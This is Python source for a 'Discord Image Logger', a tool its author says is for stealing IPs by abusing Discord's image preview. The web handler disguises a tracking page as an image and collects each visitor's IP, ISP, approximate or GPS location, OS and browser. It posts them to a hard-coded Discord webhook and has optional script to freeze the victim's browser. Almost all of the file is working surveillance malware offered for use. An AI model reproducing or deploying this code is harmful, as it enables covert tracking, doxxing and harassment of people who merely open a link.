# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1446009817310433320/dWAlK82bWPw0fJ-t_GH5x6BDDULi7Ofn-MYe6qUKeVsrTet9LWB-M4O_P6jlkWkEEkI5",
    "image": "data:image/webp;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
